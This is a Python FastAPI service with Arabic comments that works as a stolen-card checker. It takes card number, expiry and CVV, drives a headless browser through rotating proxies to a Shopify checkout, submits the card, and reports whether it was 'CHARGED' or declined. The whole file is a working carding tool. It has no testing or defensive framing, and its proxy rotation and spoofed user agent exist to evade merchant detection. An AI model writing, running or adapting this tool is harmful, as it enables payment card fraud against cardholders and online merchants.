from fastapi import FastAPI, Query
from playwright.async_api import async_playwright
import uvicorn
import random

app = FastAPI()

# قائمة البروكسيات (يمكنك استبدالها بقراءة ملف نصي إذا كانت القائمة كبيرة)
PROXY_LIST = [
    "http://user:pass@host:port",
    "http://user:pass@host:port",
    # أضف هنا بروكسياتك
]

@app.get("/check")
async def check_card(cc: str = Query(...), site: str = Query(...)):
    # اختيار بروكسي عشوائي
    proxy_url = random.choice(PROXY_LIST)
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        
        # إعداد السياق مع البروكسي
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            proxy={"server": proxy_url} 
        )
        page = await context.new_page()
        
        try:
            await page.goto(f"{site}/checkout")
            cc_parts = cc.split('|')
            
            frame = page.frame_locator('iframe[title="Secure card payment input frame"]')
            await frame.locator('input[name="number"]').fill(cc_parts[0])
            await frame.locator('input[name="expiry"]').fill(f"{cc_parts[1]}/{cc_parts[2]}")
            await frame.locator('input[name="verification_value"]').fill(cc_parts[3])
            
            await page.locator('button#continue-button').click()
            
            try:
                await page.wait_for_selector('.notice--error, .field__message--error, .order-summary__section--product', timeout=15000)
            except:
                pass
            
            content = await page.content().lower()
            
            raw_error = ""
            error_element = page.locator('.notice--error, .field__message--error').first
            if await error_element.count() > 0:
                raw_error = (await error_element.text_content()).strip()

            if "thank-you" in page.url or "success" in content:
                response = "CHARGED"
                status = "true"
            elif raw_error:
                response = raw_error
                status = "false"
            else:
                response = "CARD_DECLINED"
                status = "false"
            
            await browser.close()
            return {
                "Gateway": "Shopify Payments", 
                "Response": response, 
                "Status": status, 
                "CC": cc,
                "Used_Proxy": proxy_url.split('@')[-1] # إرجاع البروكسي المستخدم بدون كلمة السر
            }
            
        except Exception as e:
            await browser.close()
            return {
                "Gateway": "Shopify Payments", 
                "Response": "CONN_ERROR", 
                "Status": "false", 
                "CC": cc
            }

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
